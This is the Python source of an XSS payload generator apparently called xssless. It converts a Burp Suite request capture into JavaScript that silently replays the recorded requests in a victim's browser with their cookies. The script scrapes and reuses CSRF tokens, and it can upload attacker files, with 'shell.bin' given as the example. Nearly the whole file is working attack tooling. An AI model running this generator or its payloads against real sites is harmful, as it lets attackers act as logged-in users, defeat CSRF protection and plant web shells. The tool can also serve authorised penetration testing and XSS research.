#!/usr/bin/env python

import sys
from bs4 import BeautifulSoup
import base64
import json
import os
import mimetypes

# Import burp export and return a list of decoded data
def get_burp_list(filename):
    if not os.path.exists(filename):
        return []

    with open(filename) as f:
            filecontents = f.read()

    archive = BeautifulSoup(filecontents, "xml")

    requestList = []
    item = archive.find_all('item')

    for item in archive.find_all('item'):
        tmpDict = {}
        tmpDict['request'] = base64.b64decode(item.request.string)
        tmpDict['response'] = base64.b64decode(item.response.string)
        tmpDict['url'] = item.url.string
        requestList.append(tmpDict)
        del tmpDict
    
    return requestList

# Return hex encoded string output of binary input
def payload_encode_file(input_file):
    filecontents = open(input_file).read()
    hue = filecontents.encode("hex")
    filecontents = '\\x' + '\\x'.join(hue[i:i+2] for i in xrange(0, len(hue), 2)) # Stackoverflow, because pythonistic
    return filecontents

# Return hex encoded string output of binary input
def payload_encode_input(filecontents):
    hue = filecontents.encode("hex")
    filecontents = '\\x' + '\\x'.join(hue[i:i+2] for i in xrange(0, len(hue), 2)) # Stackoverflow, because pythonistic
    return filecontents

# Get a list of headers for request/response
def parse_request(input_var, url):
    
    # Set flags for later interpretation (ie, POST is actually JSON data, etc)
    flags = []

    # Split request into headers/body and parse header into list
    request_parts = input_var.split("\r\n\r\n")
    header_data = request_parts[0]

    if len(request_parts) > 2:
        body_data = "\r\n\r\n".join(request_parts[1:]) # Get everything after the first \r\n\r\n incase of file upload
    else:
        body_data = request_parts[1] # Only two parts so it's just a regular POST

    header_lines = header_data.split("\r\n")
    header_lines = filter(None, header_lines) # Filter any blank lines

    # Pop off the first one because GET / HTTP 1.1
    rtype_line = header_lines.pop(0)
    rtypeList = rtype_line.split(" ")

    # Create a list of the headers:
    # headerList[0]['Key'] = "Cookies"
    # headerList[0]['Value'] = "PHPSESSID=5fffa5e6e11ddcf3c722533c14adc310"
    headerList = []
    host = ""
    for line in header_lines:
        tmpList = line.split(": ")
        headerDict = {}
        headerDict['Key'] = tmpList[0]
        headerDict['Value'] = tmpList[1]

        # Grab important values
        if headerDict['Key'].lower() == "host":
            host = headerDict['Value']

        headerList.append(headerDict)
        del headerDict
        del tmpList

    postisupload = False
    fileboundary = ""

    for headerpair in headerList:
        if headerpair['Key'] == 'Content-Type':
            if 'boundary=' in headerpair['Value']:
                fileboundary = headerpair['Value'].split("boundary=")[1] 
                postisupload = True

    # List of all POST data
    bodyList = []

    # If the form is multipart the rules change, set values accordingly and pass it one
    if postisupload:
        postpartsList = body_data.split(fileboundary)
        
        # FF adds a bunch of '-' characters, so we'll filter out anything without a Content-Disposition in it
        for key, value in enumerate(postpartsList):
            if 'Content-Disposition' not in value:
                postpartsList.remove(value)

        for part in postpartsList:
            sectionHeader, sectionBody = part.split("\r\n\r\n")
            sectionBody = sectionBody.replace("\r\n--", "")
            tmp = {}
            tmp['name'] = sectionHeader.split("name=\"")[1].split("\"")[0] # Hacky name parsing solution

            if 'filename="' in sectionHeader:
                tmp['isfile'] = True
                tmp['filename'] = sectionHeader.split("filename=\"")[1].split("\"")[0] # Same
                tmp['contenttype'] = sectionHeader.split("Content-Type: ")[1]
                tmp['binary'] = sectionBody
                sectionBody = payload_encode_input(sectionBody)
            else:
                tmp['isfile'] = False

            tmp['body'] = sectionBody
            bodyList.append(tmp)
            del tmp
            del sectionHeader
            del sectionBody

    else:
        # Create a list of body values (check for JSON, etc)
        # bodyList[0]['Key'] = "username"
        # bodyList[0]['Value'] = "mandatory"
        body_var_List = body_data.split("&")
        body_var_List = filter(None, body_var_List)
        for item in body_var_List:
            tmpList = item.split("=")
            bodyDict = {}
            bodyDict['Key'] = tmpList[0]
            bodyDict['Value'] = tmpList[1]
            bodyList.append(bodyDict)
            del tmpList
            del bodyDict

        
    # Returned dict, chocked full of useful information formatted nicely for your convienience!
    returnDict = {}
    returnDict['method'] = rtypeList[0] # Method being used (POST, GET, PUT, DELETE, HEAD)
    returnDict['path'] = rtypeList[1] # Path for request
    returnDict['host'] = host 
    returnDict['http_version'] = rtypeList[2] # Version of HTTP reported
    returnDict['headerList'] = headerList # List of header key/values
    returnDict['bodyList'] = bodyList # List of body key/values
    returnDict['header_text'] = header_data # Raw text of HTTP headers
    returnDict['body_text'] = body_data # Raw text of HTTP body
    returnDict['flags'] = flags # Special flags
    returnDict['url'] = url
    returnDict['isupload'] = postisupload
    returnDict['boundary'] = fileboundary

    return returnDict

# Parse response
def parse_response(input_var, url):
    # Set flags for later interpretation (ie, POST is actually JSON data, etc)
    flags = []

    # Split request into headers/body and parse header into list
    request_parts = input_var.split("\r\n\r\n")
    header_data = request_parts[0]
    body_data = request_parts[1]
    header_lines = header_data.split("\r\n")
    header_lines = filter(None, header_lines) # Filter any blank lines

    # Pop off the first one because HTTP/1.1 200 OK
    rtype_line = header_lines.pop(0)
    rtypeList = rtype_line.split(" ")

    # Create a list of the headers:
    # headerList[0]['Key'] = "Cookies"
    # headerList[0]['Value'] = "PHPSESSID=5fffa5e6e11ddcf3c722533c14adc310"
    headerList = []
    content_type = ""
    for line in header_lines:
        tmpList = line.split(": ")
        headerDict = {}
        headerDict['Key'] = tmpList[0]
        headerDict['Value'] = tmpList[1]

        if headerDict['Key'].lower() == "Content-Type".lower():
            content_type = headerDict['Value']

        headerList.append(headerDict)
        del headerDict
        del tmpList

    # Returned dict, chocked full of useful information formatted nicely for your convienience!
    returnDict = {}
    returnDict['status'] = rtypeList[1] # Method being used (POST, GET, PUT, DELETE, HEAD)
    returnDict['statusmsg'] = rtypeList[2] # Path for request
    returnDict['http_version'] = rtypeList[0] # Version of HTTP reported
    returnDict['headerList'] = headerList # List of header key/values
    returnDict['header_text'] = header_data # Raw text of HTTP headers
    returnDict['body_text'] = body_data # Raw text of HTTP body
    returnDict['content_type'] = content_type # Text of the content type
    returnDict['flags'] = flags # Special flags
    returnDict['url'] = url

    return returnDict

# Generate the main payload
def xss_gen(requestList, settingsDict):

    # Start of the payload, uncompressed
    payload = """
<script type="text/javascript">
    var funcNum = 0;
    function doRequest(url, method, body)
    {
        var http = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
        http.withCredentials = true;
        http.onreadystatechange = function() {
            if (this.readyState == 4) {
                var response = http.responseText; 
                var d = document.implementation.createHTMLDocument("");
                d.documentElement.innerHTML = response;
                requestDoc = d;
                funcNum++;
                try {
                    window['r' + funcNum](requestDoc);
                } catch (error) {}
            }    
        };
        if(method == "POST")
        {
            http.open('POST', url, true);
            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            http.setRequestHeader('Content-length', body.length);
            http.setRequestHeader('Connection', 'close');
            http.send(body);
        } else if (method == "MPOST") {
            http.open('POST', url, true);
            var bound = Math.random().toString(36).slice(2);
            body = body.split("BOUNDMARKER").join(bound);
            http.setRequestHeader('Content-type', 'multipart/form-data, boundary=' + bound);
            http.setRequestHeader('Content-length', body.length);
            http.setRequestHeader('Connection', 'close');
            http.sendAsBinary(body);
                
        } else if (method == "GET") {
            http.open('GET', url, true); 
            http.send();
        } else if (method == "HEAD") {
            http.open('HEAD', url, true); 
            http.send();
        }
    }
    r0();
"""

    # Function chaining is implemented to avoid the issue of freezing the user's browser during 'secret' JS activity
    # Each request is done as a function that one requestion completion, calls the next function.
    # The result is an unclobered browser and no race conditions! (Because cookies may need to be set, etc)

    # Counter for function numbers
    i = 0
    for conv in requestList:
        requestDict = parse_request(conv['request'], conv['url'])
        responseDict = parse_response(conv['response'], conv['url']) # Currently unused, for future heuristics

        payload += "    function r" + str(i) + "(requestDoc){\n"

        if requestDict['method'].lower() == "post":
            if requestDict['isupload'] == True:
                payload += "       doRequest('" + requestDict['path'] + "', 'MPOST', '"
                multipart = ""
                for item in requestDict['bodyList']:
                    multipart += "--BOUNDMARKER\\r\\n"
                    if item['isfile'] == True:

                        if 'fileDict' in settingsDict:
                            if item['name'] in settingsDict['fileDict']:
                                filecontents = payload_encode_file(settingsDict['fileDict'][item['name']])

                                # Find content type
                                content_type = mimetypes.guess_type(settingsDict['fileDict'][item['name']])[0]

                                if content_type is None:
                                    content_type = "application/octet-stream"

                                multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"; filename="' + item['filename'] + '"\\r\\n'
                                multipart += 'Content-Type: ' + content_type + '\\r\\n\\r\\n'
                                multipart += filecontents + '\\r\\n'

                                del filecontents
                                del content_type
                            else:
                                multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"; filename="' + item['filename'] + '"\\r\\n'
                                multipart += 'Content-Type: ' + item['contenttype'] + '\\r\\n\\r\\n'
                                multipart += item['body'] + '\\r\\n'
                        else:
                            multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"; filename="' + item['filename'] + '"\\r\\n'
                            multipart += 'Content-Type: ' + item['contenttype'] + '\\r\\n\\r\\n'
                            multipart += item['body'] + '\\r\\n'
                    else:
                        if 'parseList' in settingsDict:
                            if item['name'] in settingsDict['parseList']:
                                multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"\\r\\n\\r\\n'
                                multipart += "' + encodeURIComponent(requestDoc.getElementsByName('" + item['name'] + "')[0].value) + '" + '\\r\\n'
                            else:
                                multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"\\r\\n\\r\\n'
                                multipart += item['body'] + '\\r\\n'
                        else:
                            multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"\\r\\n\\r\\n'
                            multipart += item['body'] + '\\r\\n'

                multipart += "--BOUNDMARKER--"
                payload += multipart
                payload += "');\n"
            else:
                postString = ""
                for pair in requestDict['bodyList']:
                    if 'parseList' in settingsDict:
                        if pair['Key'] in settingsDict['parseList']:
                            postString += pair['Key'] + "=" + "' + encodeURIComponent(requestDoc.getElementsByName('" + pair['Key'] + "')[0].value) + '&"
                        else:
                            postString += pair['Key'] + "=" + pair['Value'] + "&"
                    else:
                        postString += pair['Key'] + "=" + pair['Value'] + "&"

                postString = postString[:-1] # Remove last &

                payload += "        doRequest('" + requestDict['path'] + "', 'POST', '" + postString + "');\n"

        elif requestDict['method'].lower() == "get":
            payload += "        doRequest('" + requestDict['path'] + "', 'GET', '');\n"
        elif requestDict['method'].lower() == "head":
            payload += "        doRequest('" + requestDict['path'] + "', 'HEAD', '');\n"
            pass

        payload += "    }\n"
        payload += "\n"
        i += 1

    payload += "</script>"
    return payload

logo = """
                      .__                        
___  ___  ______ _____|  |   ____   ______ ______
\  \/  / /  ___//  ___/  | _/ __ \ /  ___//  ___/
 >    <  \___ \ \___ \|  |_\  ___/ \___ \ \___ \ 
/__/\_ \/____  >____  >____/\___  >____  >____  >
      \/     \/     \/          \/     \/     \/ 
               The automatic XSS payload generator
                     By mandatory (Matthew Bryant)
    https://github.com/mandatoryprogrammer/xssless
"""

helpmenu = """
Example: """ + sys.argv[0] + """ [ OPTION(S) ] [ BURP FILE ]

-h               Show's this help menu
-p=PARSEFILE     Parse list - input file containing a list of CSRF token names to be automatically parsed and set with JS.
-f=FILELIST      File list - input list of POST name/filenames to use in payload. ex: 'upload_filename,~/Desktop/shell.bin'
-s               Don't display the xssless logo

"""
if len(sys.argv) < 2:
    print logo
    print helpmenu
else:
    # settingsDict will contain code generation settings, such as waiting for each request to complete, etc.
    settingsDict = {}

    showlogo = True

    for option in sys.argv[1:]:
        if option == "-h":
            print logo
            print helpmenu
            sys.exit()
        if option == "-s":
            showlogo = False
        if "-p=" in option:
            parsefile = option.replace("-p=", "")
            if os.path.isfile(parsefile):
               tmpList = open(parsefile).readlines()
               for key,value in enumerate(tmpList):
                   tmpList[key] = value.replace("\n", "")
               if len(tmpList):
                   settingsDict['parseList'] = tmpList
               del tmpList
            else:
                print "Error, parse list not found!"
        if "-f=" in option:
            fileuploadlist = option.replace("-f=", "")
            if os.path.isfile(fileuploadlist):
                tmpDict = {}
                fileuploadlinesList = open(fileuploadlist).readlines()
                for key, value in enumerate(fileuploadlinesList):
                    rowparts = value.replace("\n", "").split(",", 1)
                    if len(rowparts) == 2:
                        if os.path.isfile(rowparts[1]):
                            tmpDict[rowparts[0]] = rowparts[1]
                        else:
                            print "File '" + rowparts[1] + "' not found!"
                            sys.exit()
                    else:
                        print "Error while parsing file " + fileuploadlist + " on line #" + str(key)
                        print "    ->'" + value.replace("\n", "") + "'"
                        sys.exit()
                    del rowparts
                if tmpDict:
                    settingsDict['fileDict'] = tmpDict

                del tmpDict
                del fileuploadlinesList
            else:
                print "Input filelist not found!"
                sys.exit()

    if os.path.exists(sys.argv[-1]):
        inputfile = sys.argv[-1]
    else:
        inputfile = ""

    if showlogo:
        print logo

    if inputfile:
        requestList = get_burp_list(inputfile)
        print xss_gen(requestList, settingsDict)
    else:
        print "Error while processing Burp export, please ensure the file exists!"
